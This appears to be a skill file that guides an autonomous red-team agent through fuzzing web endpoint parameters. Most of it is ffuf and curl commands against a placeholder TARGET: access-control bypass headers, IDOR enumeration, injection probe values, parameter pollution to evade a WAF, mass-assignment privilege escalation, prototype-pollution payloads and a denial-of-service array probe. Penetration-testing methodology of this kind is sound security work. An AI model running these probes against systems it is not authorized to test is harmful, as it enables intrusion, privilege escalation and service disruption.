---
name: parameter-fuzzing
description: Discover hidden parameters, test values, and identify input handling anomalies
origin: RedteamOpencode
---

# Parameter Fuzzing

## When to Activate

- Endpoint needs parameter testing or hidden/debug parameter discovery
- IDOR, access control, or logic bug testing via parameter manipulation
- API accepts unknown parameters

## Tools

`run_tool ffuf` (primary), `run_tool curl` (verification), `run_tool arjun` (dedicated param discovery, if available)

## Autonomous wordlist guardrail

Unattended runs must never glob, inspect, or depend on host-global wordlist
directories such as `/usr/share/seclists/**` or `/usr/share/wordlists/**`.
Those paths trigger `external_directory` permission prompts and can stall the
runtime. Before using `ffuf`, create a workspace-local wordlist under the active
engagement directory, for example `$DIR/scans/param-wordlist.txt`, from the
bounded built-in candidates below plus any endpoint-specific names observed in
the assigned case batch. If a larger corpus is required but no workspace-local
copy already exists, return `REQUEUE` with that blocker instead of asking for
permission or scanning outside `/workspace`.

```bash
PARAM_WORDLIST="$DIR/scans/param-wordlist.txt"
cat > "$PARAM_WORDLIST" <<'EOF'
id
user
userId
accountId
orderId
debug
test
admin
role
redirect
returnUrl
next
callback
token
csrf
apiKey
query
search
limit
offset
sort
filter
EOF
```

## Methodology

### 1. Establish Baseline
```bash
run_tool curl -s -o /dev/null -w "Code: %{http_code}, Size: %{size_download}" https://TARGET/endpoint
```
Record baseline response size for `-fs` filter.

### 2. GET Parameter Discovery
```bash
run_tool ffuf -u "https://TARGET/endpoint?FUZZ=test" \
  -w "$PARAM_WORDLIST" -fs BASELINE_SIZE
# Or with auto-calibration: -ac
```

### 3. POST Parameter Discovery
```bash
# URL-encoded
run_tool ffuf -u "https://TARGET/endpoint" -X POST -d "FUZZ=test" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -w "$PARAM_WORDLIST" -fs BASELINE_SIZE
# JSON
run_tool ffuf -u "https://TARGET/endpoint" -X POST -d '{"FUZZ":"test"}' \
  -H "Content-Type: application/json" \
  -w "$PARAM_WORDLIST" -fs BASELINE_SIZE
```

### 4. Value Fuzzing
```bash
run_tool ffuf -u "https://TARGET/endpoint?id=FUZZ" -w <(seq 1 1000) -fs BASELINE_SIZE  # IDOR
printf '%s\n' "'" '"' '<' '>' '../' '{{7*7}}' '${7*7}' 'true' 'false' 'null' > "$DIR/scans/value-fuzz.txt"
run_tool ffuf -u "https://TARGET/endpoint?param=FUZZ" -w "$DIR/scans/value-fuzz.txt" -fs BASELINE_SIZE
# Boolean/toggle: test true,false,1,0,yes,no,null via loop
# Role values: admin,root,user,guest,superadmin via loop
```

### 5. Header Fuzzing
```bash
run_tool ffuf -u "https://TARGET/endpoint" -H "FUZZ: test" \
  -w "$PARAM_WORDLIST" -fs BASELINE_SIZE
# Common bypass headers:
for header in "X-Forwarded-For: 127.0.0.1" "X-Real-IP: 127.0.0.1" "X-Original-URL: /admin" \
  "X-Debug: true" "X-Debug-Mode: 1" "X-Forwarded-Host: localhost"; do
  run_tool curl -s -o /dev/null -w "%{http_code} %{size_download}" -H "$header" "https://TARGET/endpoint"
done
```

### 6. Cookie Fuzzing
```bash
run_tool ffuf -u "https://TARGET/endpoint" -b "FUZZ=test" \
  -w "$PARAM_WORDLIST" -fs BASELINE_SIZE
```

### 7. Multi-Parameter / Clusterbomb
```bash
run_tool ffuf -u "https://TARGET/endpoint?W1=W2" -w params.txt:W1 -w values.txt:W2 \
  -mode clusterbomb -fs BASELINE_SIZE
```

### 8. Arjun
```bash
run_tool arjun -u "https://TARGET/endpoint" -m GET    # or POST, JSON
run_tool arjun -u "https://TARGET/endpoint" -w custom_params.txt
```

### 9. Verification
```bash
run_tool curl -sv "https://TARGET/endpoint?discovered_param=test" 2>&1
diff <(run_tool curl -s "https://TARGET/endpoint") <(run_tool curl -s "https://TARGET/endpoint?param=value")
```

### 10. Parameter Pollution (HPP)

Different frameworks resolve duplicate keys differently (first/last/array-join/concat) — this
can bypass a single validator, smuggle a second value past WAF inspection of the first, or
override a value set earlier in the request pipeline:

```bash
run_tool curl -s "https://TARGET/endpoint?id=1&id=2"                       # which wins?
run_tool curl -s "https://TARGET/endpoint?id[]=1&id[]=2"                   # PHP array-style
run_tool curl -s "https://TARGET/endpoint?id=1;id=2"                       # semicolon-delimited (older frameworks)
run_tool curl -s -X POST "https://TARGET/endpoint" -d "role=user&role=admin"
run_tool curl -s -X POST "https://TARGET/endpoint" -H "Content-Type: application/json" \
  -d '{"role":"user","role":"admin"}'                                      # duplicate JSON key — last-write-wins in most parsers
```
Compare response/behavior against single-value baseline; a differential confirms the backend and any WAF/validation layer disagree on which value is authoritative.

### 11. Type Confusion / Coercion Fuzzing

APIs that don't strictly type-check JSON bodies often mis-handle non-scalar substitutions:

```bash
for payload in '{"id":123}' '{"id":"123"}' '{"id":true}' '{"id":null}' '{"id":[]}' '{"id":{}}' '{"id":["1","2"]}'; do
  run_tool curl -s -X POST "https://TARGET/endpoint" -H "Content-Type: application/json" -d "$payload" -w " [%{http_code}]\n"
done
# An array/object where a scalar is expected can trigger a NoSQL operator-injection style bypass
# (e.g. {"password":{"$ne":null}}) — hand a confirmed case to nosql-injection.
```

### 12. Mass-Assignment-Style Extra-Field Probing

Distinct from hidden-param discovery: here the parameter name is *known* from the schema but
normally server-controlled (role, isAdmin, price, balance, status, verified, ownerId):

```bash
run_tool curl -s -X POST "https://TARGET/endpoint" -H "Content-Type: application/json" \
  -d '{"name":"test","role":"admin","isAdmin":true,"verified":true,"price":0,"status":"approved"}'
```
Any accepted overwrite of a server-controlled field is a `mass-assignment` finding, not just a fuzzing note.

### 13. Array/Depth Limit and Prototype-Pollution Probes

```bash
run_tool curl -s "https://TARGET/endpoint?id[0]=1&id[1]=2&id[2]=3"          # array depth
python3 -c "print('id[]=1&' * 5000)" | run_tool curl -s -X POST "https://TARGET/endpoint" -d @- -H "Content-Type: application/x-www-form-urlencoded"  # excessive array keys — DoS/complexity-attack signal, escalate to resource-exhaustion-testing
run_tool curl -s -X POST "https://TARGET/endpoint" -H "Content-Type: application/json" \
  -d '{"__proto__":{"polluted":"yes"}}'
run_tool curl -s -X POST "https://TARGET/endpoint" -H "Content-Type: application/json" \
  -d '{"constructor":{"prototype":{"polluted":"yes"}}}'
# Any observable effect from __proto__/constructor.prototype keys -> hand off to prototype-pollution
```

### 14. Wordlist Escalation Tiers

Don't jump straight to the largest corpus — escalate only when the smaller tier returns
nothing, to keep request volume proportional to signal:

```bash
# L1: bounded PARAM_WORDLIST built above (~20 names) — always run first
# L2: seclists param-mining lists if a workspace-local copy exists in $DIR/scans/
#     (burp-parameter-names.txt, common-api-parameters.txt) — copy once, don't glob host paths live
# L3: Arjun's own bundled wordlist via -w flag, or a JSON-derived custom list (see 15/16 below)
run_tool arjun -u "https://TARGET/endpoint" -w "$DIR/scans/param-wordlist-l2.txt" -m GET
```

### 15. JS-Mined Parameter Names

Endpoint-specific parameter names rarely appear in generic wordlists but often leak directly
from client bundles already pulled by `source-analysis` — reuse that output instead of
guessing blind:

```bash
# Pull query-string keys, fetch/axios body keys, and destructured request-object fields
grep -noE '[?&]([a-zA-Z_][a-zA-Z0-9_]{1,30})=' "$DIR/downloads/"*.js | sed -E 's/.*[?&]([a-zA-Z0-9_]+)=/\1/' | sort -u > "$DIR/scans/param-js-mined.txt"
grep -noE '(body|data|params)\s*:\s*\{[^}]*\}' "$DIR/downloads/"*.js | grep -oE '[a-zA-Z_][a-zA-Z0-9_]*(?=\s*:)' | sort -u >> "$DIR/scans/param-js-mined.txt"
sort -u "$DIR/scans/param-js-mined.txt" -o "$DIR/scans/param-js-mined.txt"
run_tool ffuf -u "https://TARGET/endpoint?FUZZ=test" -w "$DIR/scans/param-js-mined.txt" -fs BASELINE_SIZE
```
This targets the exact parameter names the app actually uses — a much higher hit rate than
a generic dictionary, and it's zero-cost since the JS was already fetched during recon.

### 16. GraphQL-Introspection-Derived Argument Names

When `source-analysis` or `graphql-testing` has already pulled a schema via introspection,
mine field/input-type argument names as a targeted wordlist for REST siblings of the same
API (many backends expose both a GraphQL and a legacy REST surface with overlapping fields):

```bash
jq -r '.data.__schema.types[]? | select(.inputFields != null) | .inputFields[].name' "$DIR/scans/graphql_schema.json" | sort -u > "$DIR/scans/param-graphql-mined.txt"
jq -r '.data.__schema.types[]? | .fields[]?.args[]?.name' "$DIR/scans/graphql_schema.json" | sort -u >> "$DIR/scans/param-graphql-mined.txt"
sort -u "$DIR/scans/param-graphql-mined.txt" -o "$DIR/scans/param-graphql-mined.txt"
run_tool ffuf -u "https://TARGET/api/endpoint?FUZZ=test" -w "$DIR/scans/param-graphql-mined.txt" -fs BASELINE_SIZE
```
